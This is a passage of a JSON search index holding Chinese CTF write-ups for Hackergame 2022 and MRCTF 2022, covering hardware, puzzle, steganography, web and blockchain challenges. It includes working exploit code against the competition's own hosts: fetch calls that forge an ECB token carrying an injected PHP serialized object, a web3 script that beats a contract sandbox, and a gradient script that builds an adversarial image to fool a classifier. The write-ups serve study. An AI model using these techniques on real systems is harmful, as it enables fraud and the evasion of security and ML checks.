flag{SDF-i3-FuN!}","title":"\u5149\u4e0e\u5f71"},{"location":"writeups/hackergame2022/#_15","text":"\u6700\u8fd1\uff0c\u4f60\u542c\u8bf4\u5ba4\u53cb\u5728 SD \u5361\u65b9\u9762\u53d6\u5f97\u4e86\u4e9b\u8fdb\u5c55\u3002\u5728\u4ed6\u65e5\u590d\u4e00\u65e5\u7684\u81ea\u8a00\u81ea\u8bed\u4e2d\uff0c\u4f60\u9010\u6e10\u4e86\u89e3\u5230\u8fd9\u4e2a\u7531\u4ed6\u4e00\u4e2a\u4eba\u81ea\u4e3b\u7814\u53d1\u7684\u7247\u4e0a\u7cfb\u7edf\u73b0\u5728\u5df2\u7ecf\u53ef\u4ee5\u4ece SD \u5361\u542f\u52a8\uff1a\u5148\u7531\u201c\u7247\u4e0a ROM \u4e2d\u7684\u56fa\u4ef6\u201d\u52a0\u8f7d\u5e76\u8fd0\u884c SD \u5361\u7b2c\u4e00\u4e2a\u6247\u533a\u4e2d\u7684\u201c\u5f15\u5bfc\u7a0b\u5e8f\u201d\uff0c\u4e4b\u540e\u7531\u8fd9\u4e2a\u201c\u5f15\u5bfc\u7a0b\u5e8f\u201d\u4ece SD \u5361\u4e2d\u52a0\u8f7d\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u3002\u800c\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u76ee\u524d\u80fd\u505a\u7684\u53ea\u662f\u5411\u201c\u4e32\u53e3\u201d\u8f93\u51fa\u4e00\u4e9b\u5b57\u7b26\u3002 \u540c\u65f6\u4f60\u542c\u8bf4\uff0c\u8fd9\u4e2a\u5e76\u4e0d\u5b8c\u5584\u7684 SD \u5361\u9a71\u52a8\u53ea\u4f7f\u7528\u4e86 SD \u5361\u7684 SPI \u6a21\u5f0f\uff0c\u800c\u4f20\u8f93\u901f\u5ea6\u4e5f\u662f\u4f4e\u5f97\u611f\u4eba\u3002\u6b64\u65f6\u4f60\u7a81\u7136\u60f3\u5230\uff1a\u5982\u679c\u901f\u5ea6\u4e0d\u5feb\u7684\u8bdd\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u7528\u903b\u8f91\u5206\u6790\u4eea\u6765\u91c7\u96c6\uff08\u5077\u7a83\uff09\u8fd9\u4e2a SD \u5361\u7684\u4fe1\u53f7\uff0c\u4ece\u800c\u201c\u83b7\u5f97\u201d SD \u5361\u4ee5\u81f3\u4e8e\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u7684\u79d8\u5bc6\uff1f \u4f60\u4ece\u62bd\u5c49\u89d2\u843d\u638f\u51fa\u5403\u7070\u5df2\u4e45\u7684\u903b\u8f91\u5206\u6790\u4eea\u3002\u8fd9\u4e2a\u5c0f\u4e1c\u897f\u4ef7\u683c\u4e0d\u5230 50 \u5757\u94b1\uff0c\u91c7\u6837\u7387\u4e5f\u53ea\u6709 24 M\u3002\u4f60\u6253\u5f00 PulseView\uff0c\u628a\u91c7\u6837\u7387\u8c03\u9ad8\uff0c\u8fde\u4e0a\u5ba4\u53cb\u5f00\u53d1\u677f\u4e0a SD \u5361\u7684\u5f15\u811a\uff0c\u7136\u540e\u63a5\u901a\u4e86\u5f00\u53d1\u677f\u7684\u7535\u6e90\uff0c\u5e0c\u671b\u8fd9\u804a\u80dc\u4e8e\u65e0\u7684\u5206\u6790\u4eea\u771f\u7684\u80fd\u6293\u5230\u70b9\u4ec0\u4e48\u6709\u610f\u601d\u7684\u4fe1\u53f7\u3002\u81f3\u4e8e\u4f60\u4e3a\u4ec0\u4e48\u6ca1\u6709\u76f4\u63a5\u628a SD \u5361\u62ff\u4e0b\u6765\u8bfb\u53d6\u6570\u636e\uff0c\u5c31\u6ca1\u4eba\u77e5\u9053\u4e86\u3002 \u5f15\u5bfc\u6247\u533a \u542c\u8bf4\uff0c\u7b2c\u4e00\u4e2a flag \u85cf\u5728 SD \u5361\u7b2c\u4e00\u4e2a\u6247\u533a\u7684\u672b\u5c3e\u3002\u4f60\u80fd\u627e\u5230\u5b83\u5417\uff1f \u64cd\u4f5c\u7cfb\u7edf \u5ba4\u53cb\u7684\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u4f1a\u8f93\u51fa\u4e00\u4e9b\u8c03\u8bd5\u4fe1\u606f\u548c\u7b2c\u4e8c\u4e2a flag\u3002\u4ece\u5ba4\u53cb\u524d\u4e9b\u65e5\u5b50\u793e\u4ea4\u7f51\u7edc\u53d1\u5e03\u7684\u7ec8\u7aef\u622a\u56fe\u770b\uff0c\u8fd9\u4e2a\u201c\u64cd\u4f5c\u7cfb\u7edf\u201d\u6bcf\u6b21\u201c\u542f\u52a8\u201d\u90fd\u4f1a\u9996\u5148\u8f93\u51fa\uff1a LED: ON Memory: OK \u6216\u8bb8\u4f60\u53ef\u4ee5\u6839\u636e\u8fd9\u4e00\u90e8\u5206\u56fa\u5b9a\u7684\u8f93\u51fa\u548c\u5f15\u5bfc\u6247\u533a\u7684\u4ee3\u7801\uff0c\u5148\u641e\u6e05\u695a\u90a3\u201c\u4e32\u53e3\u201d\u548c\u201cSD \u5361\u9a71\u52a8\u201d\u5230\u5e95\u662f\u600e\u4e48\u5de5\u4f5c\u7684\uff0c\u4e4b\u540e\u518d\u4ed4\u7ec6\u7814\u7a76 flag \u5230\u5e95\u662f\u4ec0\u4e48\uff0c\u5c31\u50cf\u5f53\u5e74\u7684 Enigma \u4e00\u6837\u3002 \u7b2c\u4e00\u90e8\u5206\u76f4\u63a5\u4f7f\u7528 PulseView \u8f6f\u4ef6\u8bfb\u53d6 binary \u6587\u4ef6\uff0c\u5f97\u5230\u4fe1\u53f7\uff0c\u7136\u540e\u6dfb\u52a0 SD card\uff08SPI mode\uff09\u89e3\u7801\u5668\uff0c\u5c06\u51e0\u4e2a\u4fe1\u53f7\u63a5\u4e0a\uff0c\u5c31\u53ef\u4ee5\u5728 MOSI data \u4e2d\u770b\u5230 flag dump \u51fa\u6765\u7136\u540e\u8f6c\u6362\u5373\u53ef\u5f97\u5230 flag\uff1a flag{0K_you_goT_th3_b4sIc_1dE4_caRRy_0N} \u7b2c\u4e8c\u90e8\u5206\u8bd5\u56fe\u9006\u5411\u540e\u9762\u7684 RISCV \u6307\u4ee4\uff0c\u4f46\u5b8c\u5168\u770b\u4e0d\u51fa\u4ec0\u4e48\u6709\u610f\u4e49\u7684\u4e1c\u897f\uff0c\u6000\u7591\u662f\u6570\u636e\u641e\u9519\u4e86\uff0c\u61d2\u5f97\u4fee\uff0c\u7f62\u4e86\u3002","title":"\u7247\u4e0a\u7cfb\u7edf"},{"location":"writeups/hackergame2022/#_16","text":"\u8fd9\u662f\u4e00\u4e2a\u53ef\u7231\u7684\u4f01\u9e45\u6ed1\u5757\u62fc\u76d8\u3002\uff08\u89c9\u5f97\u4e0d\u53ef\u7231\u7684\u540c\u5b66\u53ef\u4ee5\u6362\u53ef\u7231\u7684\u9898\u505a\uff09 \u548c\u5e02\u9762\u4e0a\u53ea\u80fd\u6253\u4e71\u4e4b\u540e\u62fc\u56de\u7684\u666e\u901a\u6ed1\u5757\u62fc\u76d8\u4e0d\u540c\uff0c\u8fd9\u4e2a\u62fc\u76d8\u662f\u81ea\u52a8\u6253\u4e71\u62fc\u56de\u7684\u3002\u4e00\u6b21\u6e38\u620f\u53ef\u4ee5\u5e2e\u52a9\u60a8\u4f53\u9a8c\u5230 16/256/4096 \u6b21\u666e\u901a\u62fc\u76d8\u7684\u4e50\u8da3\u3002 \u6bcf\u4e00\u6b65\u7684\u6253\u4e71\u7684\u65b9\u5f0f\u6709\u4e24\u79cd\uff0c\u9009\u62e9\u54ea\u4e00\u79cd\u5219\u7531\u60a8\u7684\u8f93\u5165\uff08\u957f\u5ea6\u4e3a 4/16/64 \u7684 0/1 \u5e8f\u5217\uff09\u7684\u67d0\u4e00\u4f4d\u51b3\u5b9a\u3002\u5982\u679c\u60a8\u5728\u6700\u540e\u80fd\u6210\u529f\u6253\u4e71\u8fd9\u4e2a\u62fc\u76d8\uff0c\u60a8\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 flag \u5566\uff0c\u5feb\u6765\u8bd5\u8bd5\u5427wwwwww \u7b2c\u4e00\u90e8\u5206\u8f93\u5165\u53ea\u6709\u56db\u4e2a bit\uff0c\u76f4\u63a5\u624b\u52a8\u8bd5\u5c31\u80fd\u8bd5\u51fa\u6765\u7b54\u6848\u662f 1000\uff0cflag\uff1a flag{it_works_like_magic_\u2026\u2026} \u7b2c\u4e8c\u90e8\u5206\u8f93\u5165\u6709 16 \u4e2a bit\uff0c\u53ef\u4ee5\u7528\u4ee3\u7801\u7206\u7834\u4e00\u4e0b\uff0c\u5c06\u9898\u7ed9\u4ee3\u7801\u4e2d\u7684\u4e3b\u903b\u8f91\u590d\u5236\u51fa\u6765\uff0c\u679a\u4e3e\u8f93\u5165\u8dd1\u4e00\u4e0b\uff1a import json from tqdm import tqdm from sys import argv class Board : def __init__ ( self ): self . b = [[ i * 4 + j for j in range ( 4 )] for i in range ( 4 )] def _blkpos ( self ): for i in range ( 4 ): for j in range ( 4 ): if self . b [ i ][ j ] == 15 : return ( i , j ) def reset ( self ): for i in range ( 4 ): for j in range ( 4 ): self . b [ i ][ j ] = i * 4 + j def move ( self , moves ): for m in moves : i , j = self . _blkpos () if m == 'L' : self . b [ i ][ j ] = self . b [ i ][ j - 1 ] self . b [ i ][ j - 1 ] = 15 elif m == 'R' : self . b [ i ][ j ] = self . b [ i ][ j + 1 ] self . b [ i ][ j + 1 ] = 15 elif m == 'U' : self . b [ i ][ j ] = self . b [ i - 1 ][ j ] self . b [ i - 1 ][ j ] = 15 else : self . b [ i ][ j ] = self . b [ i + 1 ][ j ] self . b [ i + 1 ][ j ] = 15 def __bool__ ( self ): for i in range ( 4 ): for j in range ( 4 ): if self . b [ i ][ j ] != i * 4 + j : return True return False with open ( \"chals/b16_obf.json\" ) as f : branches = json . load ( f ) b = Board () start = ... end = ... for i in tqdm ( range ( start , end )): b . reset () bits = bin ( i )[ 2 :] . zfill ( 16 ) for branch in branches : b . move ( branch [ 1 ] if bits [ branch [ 0 ]] == '1' else branch [ 2 ]) if b : print ( bits ) break \u7206\u7834\u51fa\u7ed3\u679c\u4e3a 0010111110000110\uff0cflag\uff1a flag{Branching_Programs_are_NC1_\u2026\u2026} \u7b2c\u4e09\u90e8\u5206\u592a\u590d\u6742\u4e86\uff0c\u5e94\u8be5\u7206\u7834\u4e0d\u51fa\u6765\uff0c\u6bd5\u7adf\u8fd9\u662f\u4e00\u9053 math \u9898\uff0c\u5f00\u6446\u3002","title":"\u4f01\u9e45\u62fc\u76d8"},{"location":"writeups/hackergame2022/#e","text":"\u5c0f E \u6709\u5f88\u591a\u7684 ELF \u6587\u4ef6\uff0c\u5b83\u4eec\u91cc\u9762\u7684\u51fd\u6570\u6709\u70b9\u50cf\uff0c\u80fd\u628a\u5b83\u4eec\u5339\u914d\u8d77\u6765\u5417\uff1f \u5c0f A\uff1a\u8fd9\u4e0d\u662f\u7528 BinDiff \u5c31\u53ef\u4ee5\u4e86\u5417\uff0c\u5f88\u7b80\u5355\u5427\uff1f \u53ea\u505a\u4e86\u53f3\u624b\u5c31\u884c\u7684\u7b2c\u4e00\u90e8\u5206\uff0c\u4e5f\u5c31\u662f\u4e24\u6b21\u8fbe\u5230 100% \u6b63\u786e\u3002\u62d6\u8fdb IDA \u4e2d\u786c\u770b\uff0c\u627e CFG \u56fe\u4ee5\u53ca\u6c47\u7f16\u4ee3\u7801\u6bd4\u8f83\u7c7b\u4f3c\u7684\u51fd\u6570\u5373\u53ef\uff0c\u65f6\u9650\u4e5f\u5f88\u957f\uff0c\u4e0d\u7528\u7740\u6025\uff0c\u5f88\u5bb9\u6613\u5c31\u80fd\u627e\u5230\u76f8\u4f3c\u7684\u51fd\u6570\u3002\u63d0\u4ea4\u62ff\u5230 flag\uff1a flag{easy_to_use_bindiff_\u2026\u2026} \uff08\u7b11\u6b7b\uff0c\u6839\u672c\u6ca1\u7528 bindiff\uff09 \u7b2c\u4e8c\u90e8\u5206\u8981\u6c42\u4e00\u4e2a\u5c0f\u65f6\u5185\u5b8c\u6210 100 \u9898\u4e2d\u7684 40 \u9898\uff0c\u7b2c\u4e09\u90e8\u5206\u8981\u6c42\u4e09\u5c0f\u65f6\u5185\u5b8c\u6210 200 \u9898\u4e2d\u7684 60 \u9898\uff0c\u4e0d\u60f3\u505a\uff0c\u5f00\u6446\u3002","title":"\u706b\u773c\u91d1\u775b\u7684\u5c0f E"},{"location":"writeups/mrctf2022/","text":"MRCTF 2022 Writeup \u00b6 Abstract \u53d7\u9ad8\u4e2d\u5b66\u957f\u9080\u8bf7\u6765\u6253\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u8d28\u91cf\u5f88\u9ad8\uff0c\u6253\u7684\u5f88\u723d\uff0c\u961f\u91cc\u5927\u624b\u5b50\u5f3a\u7684\u5f88\uff0c\u5e26\u7740\u62ff\u4e86\u7b2c\u4e00 misc \u6709\u4e00\u9053\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u770b\u4e86 nano \u7684 wp \u540e\u8865\u51fa\u6765\u4e86\uff0c\u8fd9\u6b21\u6bd4\u8d5b\u4e5f\u53c2\u4e0e\u4e86\u4e00\u4e0b eth \u9898\u76ee ReadLongNovel \u00b6 \u7531\u4e8e\u65f6\u95f4\u591f\u957f\u3001\u9898\u5e93\u4e0d\u5927\uff0c\u6240\u4ee5\u76f4\u63a5\u7f51\u7edc\u641c\u7d22 + \u539f\u6587 txt \u641c\u7d22\u5c31\u53ef\u4ee5\u624b\u52a8\u641e\u5dee\u4e0d\u591a flag: MRCTF{\u613f\u60a8\u7684+\u6587\u660e+\u6c38\u8fdc\u8fdb\u6b65} Connecting... \u00b6 obj \u6709\u4e2a\u6570\u636e\u4e0d\u6539\u7684\u8bdd blender \u52a0\u8f7d\u4e0d\u51fa\u6765\uff084d33 \u4e0d\u662f\u5341\u8fdb\u5236\u6570\uff09 \u7136\u540e\u53d1\u73b0\u6240\u6709 f \u90fd\u662f / \u5206\u9694\u7684\u4e09\u4e2a\u6570\u76f8\u540c\uff0c\u53ea\u6709\u8fd9\u4e00\u884c\u4e0d\u76f8\u540c >>> for each in [ 0x4d , 0x33 , 0x52 , 0x37 , 0x61 , 0x49 , 0x63 , 0x54 , 0x46 ]: ... print ( chr ( each ), end = \"\" ) ... M3R7aIcTF \u56fe\u7247\u5f00\u5934 xml \u4fe1\u606f\u4e2d\u53d1\u73b0\uff1aThank Fabien Petitcolas For his work. \u641c\u5230 mp3stego\uff0c\u7528\u5b83\u548c\u5bc6\u7801 M3R7aIcTF \u6765\u89e3\u5bc6 wav \u6587\u4ef6\uff08\u5176\u5b9e\u662f mp3\uff09\u5f97\u5230\uff1a FBGTGURXMFEWGVCGFEWSAKZAFVGVEQ2UIZ5VOSKGJFPTEMBSGJPWG33ONZSWG5C7ON2WGY3FONZWM5LMNR4SC7I base32\uff1a (M3R7aIcTF)- + -MRCTF{WIFI_2022_connect_successfully!} flag: MRCTF{WIFI_2022_connect_successfully!} Pixel \u00b6 blue plane \u770b\u8d77\u6765\u5f88\u6709\u95ee\u9898\uff0c\u628a 512 \u5f20\u56fe\u7247\u7684\u6240\u6709\u70b9\u70b9\u53e0\u52a0\uff08blue \u5404\u4e2a plane \u90fd\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2a\u662f blue 3\uff09 \u518d\u6839\u636e hint \u76f4\u63a5\u641e\u5230\u539f\u56fe\uff1a img2 = Image . new ( \"RGB\" , ( 512 , 512 )) for i in range ( 512 ): for j in range ( 512 ): img2 . putpixel (( i , j ), ( 255 , 255 , 255 )) for n in tqdm ( range ( 512 )): img = Image . open ( f \"pixel/ { n } .png\" ) width , height = img . size for i in range ( width ): for j in range ( height ): R , G , B = pix = img . getpixel (( i , j )) if B != 255 : img2 . putpixel (( i , j ), pix ) img2 . save ( f \"zigzag.png\" ) red plane 0 \u6709\u95ee\u9898 \u6839\u636e zigzag \u63a8\u6d4b\u9700\u8981\u8fdb\u884c\u4e00\u4e9b zigzag \u64cd\u4f5c\uff08\u5373\u50cf\u7d20\u70b9\u987a\u5e8f\u7684\u8f6c\u6362\uff09\u7f51\u4e0a\u627e\u627e\u4ee3\u7801\u6539\u4e00\u6539 zigzag from PIL import Image import numpy as np def zigzag ( data ): row = data . shape [ 0 ] col = data . shape [ 1 ] num = row * col lst = np . zeros ( num ,) k = 0 i = 0 j = 0 while i < row and j < col and k < num : lst [ k ] = data . item ( i , j ) k = k + 1 if ( i + j ) % 2 == 0 : if ( i - 1 ) in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) in range ( col ): j = j + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 else : i = i - 1 j = j + 1 elif ( i + j ) % 2 == 1 : if ( i + 1 ) in range ( row ) and ( j - 1 ) not in range ( col ): i = i + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) in range ( col ): j = j + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) not in range ( col ): j = j + 1 else : i = i + 1 j = j - 1 return lst def dezigzag ( data ): num = len ( data ) row = int ( num ** 0.5 ) col = int ( num ** 0.5 ) lst = np . zeros (( row , col )) k = 0 i = 0 j = 0 while i < row and j < col and k < num : lst [ i ][ j ] = data [ k ] k = k + 1 if ( i + j ) % 2 == 0 : if ( i - 1 ) in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) in range ( col ): j = j + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 else : i = i - 1 j = j + 1 elif ( i + j ) % 2 == 1 : if ( i + 1 ) in range ( row ) and ( j - 1 ) not in range ( col ): i = i + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) in range ( col ): j = j + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) not in range ( col ): j = j + 1 else : i = i + 1 j = j - 1 return lst def ZigZag ( data ): lst = zigzag ( data ) k = 0 ret = np . zeros ( data . shape ) row , col = data . shape for i in range ( row ): for j in range ( col ): ret [ i ][ j ] = lst [ k ] k += 1 return ret def deZigZag ( data ): lst = [] row , col = data . shape for i in range ( row ): for j in range ( col ): lst . append ( data [ i ][ j ]) ret = dezigzag ( lst ) return ret img = Image . open ( \"XXX\" ) . convert ( \"L\" ) arr = np . array ( img ) #for i in range(64): #for j in range(64): # arr[8*i:8*i+8, 8*j:8*j+8] = ZigZag(arr[8*i:8*i+8, 8*j:8*j+8]) #arr[8*i:8*i+8, 8*j:8*j+8] = deZigZag(arr[8*i:8*i+8, 8*j:8*j+8]) arr [ 0 : 512 , 0 : 512 ] = deZigZag ( arr [ 0 : 512 , 0 : 512 ]) img2 = Image . fromarray ( arr , \"L\" ) img2 . show () img2 . save ( \"XXX\" ) \u660e\u663e\u662f\u732b\u56fe\u7b97\u6cd5\uff0c\u53c2\u6570 20 22 cat map import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , keep_all = False , name = XXX ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 441 * x + 20 * y ) % width ny = ( 22 * x + 1 * y ) % height canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) if counter > 0 and not keep_all : os . remove ( path ) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( XXX , 512 , True ) result . show () flag: MRCTF{f8e49887132bf8977a161472781b718c} Spy_Dog \u00b6 \u8981\u6c4299.9%\u7684\u6982\u7387\u8bc6\u522b\u6210\u732b\u3002 \u7528\u68af\u5ea6\u53cd\u5411\u4f20\u64ad\u8bad\u7ec3\u7f51\u7edc\u53c2\u6570\u7684\u65b9\u5f0f\u8bad\u7ec3\u56fe\u7247\u5373\u53ef\uff0c\u4ee3\u7801\u76f4\u63a5\u6284\u7f51\u4e0a\u7684\uff1a https://www.likecs.com/show-915984.html \u7531\u4e8e\u53d6\u6574\u5e26\u6765\u7684\u95ee\u9898\uff0c\u8bad\u7ec3\u5f97\u5230\u7684\u51c6\u786e\u7387\u8981\u6bd4\u8981\u6c42\u9ad8\u4e00\u70b9 exp # %% from keras.models import load_model import cv2 import numpy as np from keras.preprocessing import image from keras.applications import inception_v3 from keras import backend as K from PIL import Image import tensorflow as tf tf . compat . v1 . disable_eager_execution () # %% model = load_model ( \"simplenn.model\" ) # %% # Grab a reference to the first and last layer of the neural net model_input_layer = model . layers [ 0 ] . input model_output_layer = model . layers [ - 1 ] . output object_type_to_fake = 1 # Load the image to hack img = cv2 . imread ( \"dog.bmp\" ) original_image = img . astype ( np . float32 ) # Scale the image so all pixel intensities are between [-1, 1] as the model expects original_image /= 255. # Add a 4th dimension for batch size (as Keras expects) original_image = np . expand_dims ( original_image , axis = 0 ) # Pre-calculate the maximum change we will allow to the image # We\\'ll make sure our hacked image never goes past this so it doesn\\'t look funny. # A larger number produces an image faster but risks more distortion. max_change_above = original_image + ( 9.4 / 255. ) max_change_below = original_image - ( 9.4 / 255. ) # Create a copy of the input image to hack on hacked_image = np . copy ( original_image ) # How much to update the hacked image in each iteration learning_rate = 0.1 # Define the cost function. # Our \\'cost\\' will be the likelihood out image is the target class according to the pre-trained model cost_function = model_output_layer [ 0 , object_type_to_fake ] # We\\'ll ask Keras to calculate the gradient based on the input image and the currently predicted class # In this case, referring to \"model_input_layer\" will give us back image we are hacking. gradient_function = K . gradients ( cost_function , model_input_layer )[ 0 ] # Create a Keras function that we can call to calculate the current cost and gradient grab_cost_and_gradients_from_model = K . function ([ model_input_layer , K . learning_phase ()], [ cost_function , gradient_function ]) cost = 0.0 # In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more # until it gets to at least 80% confidence while cost < 0.9995 : # Check how close the image is to our target class and grab the gradients we # can use to push it one more step in that direction. # Note: It\\'s really important to pass in \\'0\\' for the Keras learning mode here! # Keras layers behave differently in prediction vs. train modes! cost , gradients = grab_cost_and_gradients_from_model ([ hacked_image , 0 ]) # Move the hacked image one step further towards fooling the model hacked_image += gradients * learning_rate # Ensure that the image doesn\\'t ever change too much to either look funny or to become an invalid image hacked_image = np . clip ( hacked_image , max_change_below , max_change_above ) hacked_image = np . clip ( hacked_image , - 1.0 , 1.0 ) print ( \"Model \\' s predicted likelihood that the image is a cat: {:.8} %\" . format ( cost * 100 )) # De-scale the image\\'s pixels from [-1, 1] back to the [0, 255] range img = hacked_image [ 0 ] . copy () img *= 255. # Save the hacked image! cv2 . imwrite ( 'hacked.bmp' , img . astype ( np . uint8 )) # %% check model = load_model ( \"simplenn.model\" ) def checkMask ( model , img ): predict = model . predict ( img ) return predict [ 0 ][ 1 ] def checkSkin ( img1 , img2 ): output = [] for i in range ( 0 , len ( img1 )): for j in range ( 0 , len ( img1 [ i ])): output . append ( img2 [ i ][ j ] - img1 [ i ][ j ]) maxnum = 0 for i in output : num = 0 for j in i : if j >= 200 : j = 255 - j num = j if num >= maxnum : maxnum = num index = i print ( index ) print ( maxnum ) if maxnum > 10 : return 0 else : return 1 score = 0 img = cv2 . imread ( 'hacked.bmp' ) score += checkSkin ( img , cv2 . imread ( \"dog.bmp\" )) img = cv2 . resize ( img , ( 128 , 128 )) img_tensor = np . expand_dims ( img , axis = 0 ) img_tensor = img_tensor . astype ( np . float32 ) img_tensor /= 255. score += checkMask ( model , img_tensor ) print ( score ) flag: MRCTF{A_D0g_W1th_Br1lli4nt_Tric7} pdd \u00b6 \u65e0\u6cd5\u4f2a\u9020 ip \u8fdb\u884c\u52a9\u529b\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u8d8b\u8fd1 100 \u800c\u4e0d\u4f1a\u7b49\u4e8e \u6ce8\u610f\u5230\u9664\u88ab\u52a9\u529b\u6b21\u6570\u4ee5\u5916\u7684\u6570\u636e\u90fd\u662f\u5b58\u5728\u5ba2\u6237\u7aef\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e0a\u7684\uff0c\u5c1d\u8bd5\u63a7\u5236 name \u751f\u6210\u51fa\u76ee\u6807 enc \u5373\u53ef\uff08\u53ef\u5728 debug \u4e0a\u770b\u5230\u89e3\u5bc6\u7ed3\u679c\uff09 \u7b80\u5355\u5c1d\u8bd5\u53ef\u77e5\u52a0\u5bc6\u662f\u5e26 pad \u7684\u6bcf 16 \u5b57\u8282\u8fdb\u884c ECB \u52a0\u5bc6\u7684\u672a\u77e5\u52a0\u5bc6\u3002\uff08\u7c7b\u4f3c AES-256-ECB\uff09 let enc1 = await fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=start\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ username : 'user_tpHRGt11111111111111' }), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => x . enc ); let enc2 = await fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=start\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ username : '111111111111' + 'O:4:\"User\":3:{s:8:\"username\";s:22:\"user_tpHRGt11111111111\";s:5:\"times\";i:110;s:5:\"money\";d:100;}' }), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => x . enc ); fetch ( \"https://ppd.node3.mrctf.fun/lucky.php?action=getFlag\" , { \"headers\" : { \"content-type\" : \"application/json\" }, \"body\" : JSON . stringify ({ enc : btoa ( atob ( enc2 ). slice ( 48 ). slice ( 0 , target . length ) + atob ( enc1 ). slice ( - 16 ))}), \"method\" : \"POST\" }). then ( x => x . json ()). then ( x => { console . log ( x . flag ); }) flag: MRCTF{Xi_Xi0ngDi_9_Na_Kan_w0!} SandSandSand \u00b6 \u9898\u76ee\u5408\u7ea6 pragma solidity 0.7.0 ; contract checktheCode { function checks ( address a ) public { uint256 size ; assembly { size : = extcodesize ( a ) } require ( size < 0x10 ); } } contract BabySandbox { event SendFlag ( address ); checktheCode public A ; constructor () public { A = new checktheCode (); } function run ( address code ) external payable { bool success ; bytes memory result ; ( success , result ) = address ( A ). call ( abi . encodeWithSignature ( \"checks(address)\" , code ) ); require ( success == true ); assembly { if eq ( caller (), address ()) { switch delegatecall ( gas (), code , 0x00 , 0x00 , 0x00 , 0x00 ) case 0 { returndatacopy ( 0x00 , 0x00 , returndatasize ()) revert ( 0x00 , returndatasize ()) } case 1 { returndatacopy ( 0x00 , 0x00 , returndatasize ()) return ( 0x00 , returndatasize ()) } } if lt ( gas (), 0xB000 ) { revert ( 0x00 , 0x00 ) } calldatacopy ( 0x00 , 0x00 , calldatasize ()) if eq ( staticcall ( 0x5000 , address (), 0 , calldatasize (), 0 , 0 ), 1 ) { revert ( 0x00 , 0x00 ) } if eq ( call ( 0x5000 , address (), 0 , 0 , calldatasize (), 0 , 0 ), 0 ) { revert ( 0x00 , 0x00 ) } } emit SendFlag ( msg.sender ); } } \u7b80\u5355\u5206\u6790\u4e00\u4e0b\u5c31\u662f\u8981\u7528 0x5000 \u7684 gas \u8c03\u7528\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5408\u7ea6\uff0c\u8981\u6c42 staticcall \u8c03\u7528\u4f1a\u5931\u8d25\uff0ccall \u4f1a\u6210\u529f\uff0c\u5e76\u4e14\u5408\u7ea6\u5b57\u8282\u7801\u5728 0x10 \u4ee5\u5185 \u76f4\u63a5\u5728\u5408\u7ea6\u4e2d\u6267\u884c\u4e00\u6b21 sstore \u5c31\u53ef\u4ee5\u8ba9 staticcall \u6302\u6389\uff0cyul \u5408\u7ea6\uff1a object \"DeleCaller\" { code { sstore ( 0 , 0 ) datacopy ( 0 , dataoffset ( \"Runtime\" ), datasize ( \"Runtime\" )) return ( 0 , datasize ( \"Runtime\" )) } object \"Runtime\" { code { sstore ( 0 , 0 ) stop () } } } \u6216\u8005\u624b\u5199\u6c47\u7f16\uff1a ; \u524d\u9762\u5957\u4e00\u5c42 creationCode PUSH1 0x00 ; 6000 PUSH1 0x00 ; 6000 SSTORE ; 55 STOP ; 00 exp from web3 import Web3 w3 = Web3 ( Web3 . HTTPProvider ( 'http://retr0.vip:8545' )) hacker = '...' target = '...' privateKey = '...' def get_txn ( src , dst , data , value = 0 , gas = 0x200000 ): return { \"chainId\" : 0x4bb , \"from\" : src , \"to\" : dst , \"gasPrice\" : w3 . toWei ( 1.1 , 'gwei' ), \"gas\" : gas , \"value\" : w3 . toWei ( value , 'ether' ), \"nonce\" : w3 . eth . getTransactionCount ( src ), \"data\" : data } data = get_txn ( hacker , None , bytes . fromhex ( \"60006000556006601160003960066000f3600060005500\" )) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) print ( txn_receipt ) contractAddress = txn_receipt [ 'contractAddress' ] data = get_txn ( hacker , target , bytes . fromhex ( \"522bb704000000000000000000000000\" + contractAddress [ 2 :])) transaction = w3 . eth . account . signTransaction ( data , privateKey ) . rawTransaction txn_hash = w3 . eth . sendRawTransaction ( transaction ) . hex () txn_receipt = w3 . eth . waitForTransactionReceipt ( txn_hash ) print ( txn_receipt ) flag: MRCTF{TheShor7testShel1c0dE&EIP-2929} JOP_Gadget \u00b6 \u9898\u76ee\u7684\u610f\u601d\u5c31\u662f\u4f1a\u5148\u628a\u8f93\u5165 PUSH2 